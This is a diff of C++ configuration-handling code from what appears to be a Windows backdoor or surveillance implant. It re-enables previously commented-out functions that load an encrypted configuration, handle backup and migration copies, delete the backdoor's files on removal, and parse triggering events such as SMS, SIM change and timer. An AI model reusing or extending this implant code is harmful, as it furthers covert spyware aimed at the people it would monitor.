@@ -8,6 +8,8 @@
 #include "RecordedCalls.h"
 #include "Modules.h"
 
+#include "FunctionFunc.h"
+
 using namespace std;
 
 Conf::Conf() : encryptionObj(g_ConfKey, KEY_LEN), jMod(NULL), jEv(NULL), jAct(NULL), jGlob(NULL) {
@@ -171,7 +173,7 @@ BOOL WINAPI Conf::ParseAction(JSONArray js) {
 }
 
 BOOL WINAPI Conf::ParseEvent(JSONArray js) {
-/***
+
 	UINT i = 0;
 	EventsManager *eventsManager = EventsManager::self();
 
@@ -190,8 +192,9 @@ BOOL WINAPI Conf::ParseEvent(JSONArray js) {
 #ifdef _DEBUG
 		wprintf(L"Parsing Event: %s\n", eventName.c_str());
 #endif
-
+		
 		do {
+		/***
 			if (eventName.compare(L"ac") == 0 ) {
 				startProc = OnAC;
 				break;
@@ -231,12 +234,12 @@ BOOL WINAPI Conf::ParseEvent(JSONArray js) {
 				startProc = OnSimChange;
 				break;
 			}
-
+			***/
 			if (eventName.compare(L"timer") == 0 ) {
 				startProc = OnTimer;
 				break;
 			}
-
+			/***
 			if (eventName.compare(L"afterinst") == 0 ) {
 				startProc = OnAfterInst;
 				break;
@@ -251,6 +254,7 @@ BOOL WINAPI Conf::ParseEvent(JSONArray js) {
 				startProc = OnSms;
 				break;
 			}
+			***/
 		} while (0);
 
 		if (startProc != NULL)
@@ -258,7 +262,7 @@ BOOL WINAPI Conf::ParseEvent(JSONArray js) {
 
 		// startProc == NULL -> Unknown agent
 	}
-***/
+
 	return TRUE;
 }
 
@@ -278,7 +282,7 @@ BOOL Conf::ParseGlobal(JSONArray js) {
 }
 
 BOOL Conf::ParseConfSection(JSONValue *jVal, char *conf, WCHAR *section, confCallback_t call_back) {
-/***
+
 	JSONObject root;
 
 	if (jVal) {
@@ -302,7 +306,7 @@ BOOL Conf::ParseConfSection(JSONValue *jVal, char *conf, WCHAR *section, confCal
 	if (root.find(section) != root.end() && root[section]->IsArray()) {
 		call_back(root[section]->AsArray());
 	}
-***/
+
 	return TRUE;
 }
 
@@ -317,13 +321,13 @@ BOOL Conf::LoadConf() {
 	wstring strBack, strMig;
 	UINT Len = 0, i = 0, num = 0;
 	BOOL bBackConf = FALSE;
-/***
+
 	if (strEncryptedConfName.empty())
 		return NULL;
 
 	// Vediamo se dobbiamo migrare
 	strMig = GetMigrationName(FALSE);
-
+	
 	if (strMig.empty() == FALSE && FileExists(strMig)) {
 		strMig = GetMigrationName(TRUE);
 		strBack = GetBackupName(TRUE);
@@ -384,12 +388,12 @@ BOOL Conf::LoadConf() {
 	if (strBack.empty() == FALSE)
 		if (CopyFile2(strBack.c_str(), strPath.c_str(), FALSE) == TRUE)
 			DeleteFile(strBack.c_str());
-***/
+
 	return TRUE;
 }
 
 BOOL Conf::RemoveConf() {
-/***
+
 	wstring strbackdoorPath;
 
 	if (strEncryptedConfName.empty())
@@ -412,12 +416,11 @@ BOOL Conf::RemoveConf() {
 
 	DeleteFile(strbackdoorPath.c_str());
 	return res;
-	***/
-	return NULL;
+
 }
 
 BOOL Conf::FileExists(wstring &strInFile) {
-/***
+
 	HANDLE hConfFile = INVALID_HANDLE_VALUE;
 	wstring strCompletePath;
 
@@ -435,7 +438,7 @@ BOOL Conf::FileExists(wstring &strInFile) {
 		return FALSE;
 
 	CloseHandle(hConfFile);
-***/
+
 	return TRUE;
 }
 
@@ -464,7 +467,7 @@ BYTE* Conf::MemStringCmp(BYTE *memory, CHAR *string, UINT uLen) {
 }
 
 wstring Conf::GetBackupName(BOOL bCompletePath) {
-/***
+
 	WCHAR *pBackExt;
 	wstring strPath;
 
@@ -484,12 +487,12 @@ wstring Conf::GetBackupName(BOOL bCompletePath) {
 	free(pBackExt);
 
 	return strPath;
-***/
-	return NULL;
+
+
 }
 
 wstring Conf::GetMigrationName(BOOL bCompletePath) {
-/***
+
 	WCHAR *pBackExt;
 	wstring strPath;
 
@@ -509,6 +512,6 @@ wstring Conf::GetMigrationName(BOOL bCompletePath) {
 	free(pBackExt);
 
 	return strPath;
-***/
-	return NULL;
+
+
 }
